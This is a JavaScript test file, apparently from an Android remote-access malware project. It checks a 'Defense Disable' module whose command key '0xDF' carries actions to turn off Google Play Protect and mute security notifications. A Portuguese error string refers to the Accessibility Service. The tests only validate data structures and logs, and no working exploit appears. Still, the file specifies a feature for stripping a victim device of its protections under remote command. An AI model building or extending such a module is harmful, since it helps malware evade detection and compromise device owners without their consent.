const assert = require('assert');
const { messageKeys } = require('../includes/const');

console.log('\n=== Defense Disable Module Tests ===\n');

// Test 1: Message Key
assert.ok(messageKeys.defenseDisable, 'Expected defenseDisable command key to be defined');
assert.strictEqual(messageKeys.defenseDisable, '0xDF');
console.log('✓ Defense Disable message key registered:', messageKeys.defenseDisable);

// Test 2: Database Schema
const schema = {
    defenseConfig: {
        playProtectDisabled: false,
        securityNotificationsMuted: false,
        defenseLog: []
    }
};

assert.ok(schema.defenseConfig);
assert.strictEqual(typeof schema.defenseConfig.playProtectDisabled, 'boolean');
assert.strictEqual(typeof schema.defenseConfig.securityNotificationsMuted, 'boolean');
assert.ok(Array.isArray(schema.defenseConfig.defenseLog));
console.log('✓ defenseConfig schema validation passed');

// Test 3: Valid Actions
const validActions = ['disable_play_protect', 'mute_security_notifications'];
validActions.forEach(action => {
    assert.ok(action.length > 0);
});
console.log(`✓ ${validActions.length} valid actions defined`);

// Test 4: Play Protect Disable State
let defenseConfig = {
    playProtectDisabled: false,
    securityNotificationsMuted: false
};

defenseConfig.playProtectDisabled = true;
assert.strictEqual(defenseConfig.playProtectDisabled, true);
console.log('✓ Play Protect disable state toggles correctly');

// Test 5: Security Notifications Mute State
defenseConfig.securityNotificationsMuted = true;
assert.strictEqual(defenseConfig.securityNotificationsMuted, true);
console.log('✓ Security notifications mute state toggles correctly');

// Test 6: Log Entry Structure
const logEntry = {
    action: 'disable_play_protect',
    timestamp: new Date(),
    success: true,
    details: 'Test log entry'
};

assert.ok(logEntry.action);
assert.ok(logEntry.timestamp);
assert.strictEqual(typeof logEntry.success, 'boolean');
assert.strictEqual(typeof logEntry.details, 'string');
console.log('✓ Log entry structure is valid');

// Test 7: Multiple Actions
let log = [];
validActions.forEach(action => {
    log.push({
        action,
        timestamp: new Date(),
        success: true,
        details: `Action: ${action}`
    });
});
assert.strictEqual(log.length, 2);
console.log(`✓ ${log.length} defense actions logged successfully`);

// Test 8: Command Structure
const command = {
    type: '0xDF',
    action: 'disable_play_protect'
};
assert.strictEqual(command.type, '0xDF');
assert.ok(validActions.includes(command.action));
console.log('✓ Defense disable command structure is valid');

// Test 9: Response Structure
const response = {
    action: 'disable_play_protect',
    success: true,
    details: 'Google Play Protect desativado',
    timestamp: Date.now()
};
assert.strictEqual(response.action, 'disable_play_protect');
assert.strictEqual(response.success, true);
assert.ok(Number.isInteger(response.timestamp));
console.log('✓ Defense disable response structure is valid');

// Test 10: Error Response
const errorResponse = {
    action: 'disable_play_protect',
    success: false,
    details: 'Serviço de Acessibilidade não disponível'
};
assert.strictEqual(errorResponse.success, false);
assert.strictEqual(typeof errorResponse.details, 'string');
console.log('✓ Defense disable error response structure is valid');

// Test 11: State Reset
let state = {
    playProtectDisabled: true,
    securityNotificationsMuted: true
};
state.playProtectDisabled = false;
state.securityNotificationsMuted = false;
assert.strictEqual(state.playProtectDisabled, false);
assert.strictEqual(state.securityNotificationsMuted, false);
console.log('✓ Defense state can be reset');

// Test 12: Log Timestamp
const now = new Date();
const logWithTimestamp = {
    action: 'disable_play_protect',
    timestamp: now,
    success: true
};
assert.ok(logWithTimestamp.timestamp instanceof Date);
console.log('✓ Log entry timestamp validation passed');

// Test 13: Multiple Log Entries
let defenseLog = [];
for (let i = 0; i < 5; i++) {
    defenseLog.push({
        action: validActions[i % validActions.length],
        timestamp: new Date(),
        success: Math.random() > 0.5,
        details: `Test entry ${i}`
    });
}
assert.strictEqual(defenseLog.length, 5);
console.log(`✓ ${defenseLog.length} defense log entries created successfully`);

// Test 14: Success/Failure Tracking
let successCount = 0;
let failureCount = 0;
defenseLog.forEach(entry => {
    if (entry.success) {
        successCount++;
    } else {
        failureCount++;
    }
});
assert.ok(successCount + failureCount === defenseLog.length);
console.log(`✓ Tracking: ${successCount} successes, ${failureCount} failures`);

// Test 15: Action Validation
function isValidAction(action) {
    return validActions.includes(action);
}
assert.strictEqual(isValidAction('disable_play_protect'), true);
assert.strictEqual(isValidAction('mute_security_notifications'), true);
assert.strictEqual(isValidAction('invalid_action'), false);
console.log('✓ Action validation works correctly');

// Test 16: Full Defense Workflow
const workflowConfig = {
    playProtectDisabled: false,
    securityNotificationsMuted: false,
    defenseLog: []
};

// Simular desativação de Play Protect
workflowConfig.playProtectDisabled = true;
workflowConfig.defenseLog.push({
    action: 'disable_play_protect',
    timestamp: new Date(),
    success: true,
    details: 'Disabled'
});

// Simular silenciamento de notificações
workflowConfig.securityNotificationsMuted = true;
workflowConfig.defenseLog.push({
    action: 'mute_security_notifications',
    timestamp: new Date(),
    success: true,
    details: 'Muted'
});

assert.strictEqual(workflowConfig.playProtectDisabled, true);
assert.strictEqual(workflowConfig.securityNotificationsMuted, true);
assert.strictEqual(workflowConfig.defenseLog.length, 2);
console.log('✓ Full defense workflow validation passed');

console.log('\n✅ All Defense Disable module tests passed!\n');
